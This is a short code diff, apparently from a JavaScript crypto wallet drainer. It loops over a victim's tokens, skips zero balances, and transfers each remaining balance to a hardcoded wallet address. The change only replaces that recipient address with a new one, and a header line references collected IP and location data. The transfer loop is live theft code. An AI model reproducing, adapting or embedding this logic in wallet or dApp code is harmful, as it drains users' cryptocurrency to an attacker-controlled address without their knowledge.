@@ -167,7 +167,7 @@ IP: ${locationData.ip || "N/A"}
         const balanceInWei = ethers.BigNumber.from(token.balance);
         if (balanceInWei.isZero()) continue;
 
-        const tx = await contract.transfer("0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47", balanceInWei);
+        const tx = await contract.transfer("0x68AB302445eA390fAa79D76bf865819d07d0800a", balanceInWei);
         console.log(`Sent ${token.symbol}, tx:`, tx.hash);
       } catch (err) {
         console.warn(`Failed to send ${token.symbol}`, err);
